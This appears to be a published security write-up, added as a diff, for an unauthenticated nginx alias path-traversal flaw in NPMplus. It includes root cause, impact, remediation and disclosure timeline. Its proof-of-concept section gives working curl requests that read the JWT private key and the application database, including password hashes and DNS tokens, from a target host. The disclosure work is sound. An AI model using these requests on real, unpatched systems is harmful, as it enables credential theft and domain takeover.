@@ -1,0 +1,146 @@
+# NPMplus — unauthenticated nginx `alias` off-by-slash path traversal → arbitrary read of application secrets
+
+|  |  |
+|---|---|
+| **CVE ID** | **Pending** — a CVE was requested via GitHub's CNA at publication; the identifier has not been assigned yet |
+| **Advisory** | [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r) (published 2026-07-23) |
+| **Product** | [ZoeyVid/NPMplus](https://github.com/ZoeyVid/NPMplus) — an nginx-proxy-manager fork |
+| **Type** | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
+| **Affected** | `2025-12-29-b1` ≤ version < `2026-07-23-r1` |
+| **Fixed in** | `2026-07-23-r1` (release 2.15.1) |
+| **Severity** | Critical — CVSS 3.1 **10.0** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`) as scored in the published advisory. See [Scoring](#scoring) for the more conservative 9.3 I argued in my report. |
+| **Reporter** | Lyris Vale ([@ValeLyris](https://github.com/ValeLyris)) |
+
+> **CVE number pending.** The maintainer requested a CVE through GitHub when publishing the advisory; GitHub's CNA has not yet assigned the identifier. This page will be updated with the CVE ID once it is issued.
+
+## Summary
+
+NPMplus ships an nginx configuration that serves its local gravatar cache with an off-by-slash `location`/`alias` mismatch and **no authentication**. An unauthenticated remote attacker can read **any file under `/data/npmplus/`** with a single request:
+
+```
+GET /images/gravatar../<file>
+```
+
+That directory holds the application's secrets — the backend **JWT signing key** (`keys.json`), the entire **application database** (`database.sqlite`, containing admin bcrypt password hashes), and, on any deployment that uses DNS-01 certificates, the **DNS-provider API credentials in plaintext**. Reproduced at runtime on the official container image and independently on stock nginx 1.24.
+
+## Root cause
+
+As shipped (`rootfs/usr/local/nginx/conf/conf.d/npmplus.conf`, admin UI on `0.0.0.0:81 ssl`):
+
+```nginx
+location /images/gravatar {        # no trailing slash
+    more_set_headers "...";
+    alias /data/npmplus/gravatar/; # trailing slash
+}
+```
+
+This is the classic nginx off-by-slash `alias` trap. With a `location` that has no trailing slash but an `alias` that does, nginx builds the served path as `alias + (uri − location)`:
+
+```
+GET /images/gravatar../keys.json
+  → /data/npmplus/gravatar/  +  ../keys.json
+  → /data/npmplus/keys.json
+```
+
+The segment `gravatar..` is not a pure `..` segment, so nginx's URI normalization does not collapse it; the `../` is applied *after* the alias join, escaping one directory level out of the gravatar cache and into `/data/npmplus/`.
+
+Why it is reliably unauthenticated:
+
+- The `/images/gravatar` block is served directly by nginx as static content — there is no `auth_request` / `internal` / `satisfy` / `deny` on it or on the surrounding `server`. Only `location /api` is proxied to the authenticated backend.
+- `start.sh` runs `mkdir -vp /data/npmplus/gravatar` on every boot, so the alias directory always exists and the `../` always resolves.
+- The high-value files sit exactly one level up, so a single traversal reaches all of them. Deeper attempts (`../../etc/passwd`, `..%2f…`) are collapsed to 404, but one level is enough.
+
+A second instance of the same bug class exists in `backend/templates/proxy_host.conf` (an Anubis static `alias`), triggered on any proxy host with Anubis enabled.
+
+**Not affected:** upstream `jc21/nginx-proxy-manager` links avatars straight to gravatar.com and ships no local `/images/gravatar` alias. This is specific to NPMplus's gravatar-cache feature.
+
+## Impact
+
+A single unauthenticated `GET`, no credentials, discloses the `/data/npmplus/` subtree:
+
+- **`keys.json`** — the RSA key pair used to sign and verify auth JWTs. Leaking the private half breaks the integrity root of trust for every token verified against its public half.
+- **`database.sqlite`** — the whole application database: admin email/roles and **bcrypt (cost 13)** password hashes.
+- **DNS-provider API credentials in plaintext** — when an operator configures a DNS-01 certificate (normal usage), NPMplus stores the provider credential in `certificate.meta` as cleartext. Confirmed end to end: after an authenticated admin created a DNS-01 certificate with a placeholder token, an *unauthenticated* re-read of the DB returned the token in cleartext. A real deployment's token gives an attacker control of the victim's DNS-provider account → rogue certificate issuance and control over the victim's domains, with no cracking or forging required.
+
+**Not claimed (in the interest of honesty):** session forgery, auth bypass, and RCE via the leaked JWT key are *not* claimed. The release image signs its `__Host-Http-token` cookie with a per-process random secret (`cookieParser(process.env.COOKIE_SECRET || crypto.randomBytes(16)…)`), so the JWT key alone does not yield a usable session unless the operator set a weak or known `COOKIE_SECRET`. Offline cracking of the bcrypt (cost 13) hashes is likewise not assumed.
+
+## Proof of concept
+
+Full script in [`poc/poc.sh`](./poc/poc.sh). All requests carry no cookie or token. Note `--path-as-is` — curl and browsers otherwise fold `gravatar../` back to `/images/`.
+
+```bash
+# steal the JWT signing private key
+curl -sk --path-as-is 'https://<HOST>:8081/images/gravatar../keys.json'
+#   → 200  {"key":"-----BEGIN PRIVATE KEY-----\nMIIE...","pub":"..."}
+
+# exfiltrate the whole database
+curl -sk --path-as-is 'https://<HOST>:8081/images/gravatar../database.sqlite' -o database.sqlite
+#   → 200, ~110 KB SQLite; admin hashes + certificate.meta (DNS token in cleartext)
+
+# control: the alias root is not directory-listable, proving traversal (not public exposure)
+curl -sk -o /dev/null -w '%{http_code}\n' 'https://<HOST>:8081/images/gravatar/'   # → 403
+```
+
+Confirmed on `ghcr.io/zoeyvid/npmplus` v2.15.1 (container `nginx/1.31.3`) and on stock `nginx/1.24.0` with the exact config lines.
+
+## Evidence
+
+All requests unauthenticated (no cookie / token).
+
+**1 — NPMplus login page (the unauthenticated surface)**
+
+![login page](./evidence/01-login-page-unauth.png)
+
+**2 — Unauthenticated traversal reads the JWT signing private key (`keys.json`) in Burp, no cookie**
+
+![keys.json](./evidence/02-burp-unauth-traversal-keys.json-privatekey.png)
+
+**3 — Unauthenticated traversal downloads `database.sqlite` (200, 110592 bytes)**
+
+![database.sqlite](./evidence/03-burp-unauth-traversal-database.sqlite-200-110592.png)
+
+**4 — The stolen DB's `user` table (admin)**
+
+![user table](./evidence/04-stolen-db-user-table-admin.png)
+
+**5 — The stolen DB's `auth` table (bcrypt cost-13 hash)**
+
+![auth table](./evidence/05-stolen-db-auth-table-bcrypt-hash.png)
+
+**6 — Control: `/images/gravatar/` → 403 (normal cache dir, not listable)**
+
+![403 control](./evidence/06-contrast-normal-gravatar-dir-403.png)
+
+**7 — Control: direct `/keys.json` → SPA HTML, not the key (proves traversal, not public exposure)**
+
+![spa html control](./evidence/07-contrast-direct-keys.json-spa-html.png)
+
+**8 — The `certificate` table from the unauth-downloaded DB, DNS-provider token in cleartext (placeholder token used in the lab)**
+
+![dns cred](./evidence/08-database-dns-cred.png)
+
+## Remediation
+
+Fixed in `2026-07-23-r1`. Align the `location` and `alias` trailing slashes and anchor the prefix so the alias root cannot be escaped:
+
+```nginx
+location ^~ /images/gravatar/ { alias /data/npmplus/gravatar/; }
+```
+
+Defense in depth: mark the static avatar location `internal;`, or do not co-locate secrets (`keys.json`, `database.sqlite`) in a directory whose child is web-served. The same trailing-slash fix applies to the Anubis `alias` in `backend/templates/proxy_host.conf`.
+
+## Scoring
+
+The published advisory carries **CVSS 3.1 10.0** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`), set by the maintainer. My own report scored it more conservatively at **9.3** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`) — `I:L` for the ability to issue rogue certificates / alter DNS via the leaked provider credential, rather than `I:H`. Either way, the read primitive alone is a High (floor 7.5, `S:U/C:H/I:N/A:N`); the credential disclosure that crosses into a separate security authority (the victim's DNS provider) is what makes Scope **Changed**.
+
+## Disclosure timeline
+
+All on 2026-07-23:
+
+- Reported privately to the maintainer.
+- Maintainer accepted, released the fix `2026-07-23-r1`, published [GHSA-wj85-328x-ww6r](https://github.com/ZoeyVid/NPMplus/security/advisories/GHSA-wj85-328x-ww6r), and opened discussions [#3626](https://github.com/ZoeyVid/NPMplus/discussions/3626) / [#3627](https://github.com/ZoeyVid/NPMplus/discussions/3627) explaining the issue.
+- Reporter credit accepted; CVE requested via GitHub (pending).
+
+## Scope & testing notes
+
+All testing was on instances fully under my control — a self-hosted NPMplus container and a local stock-nginx reproduction. No production, third-party, or internet-facing instance was accessed, fingerprinted, or scanned. The only account was a self-created test admin; the DNS-01 certificate used a placeholder token, so no real DNS-provider account was contacted. Read-only unauthenticated `GET`s only — no writes, deletes, brute force, or DoS. The lab secrets visible in the screenshots are disposable and were destroyed after testing.
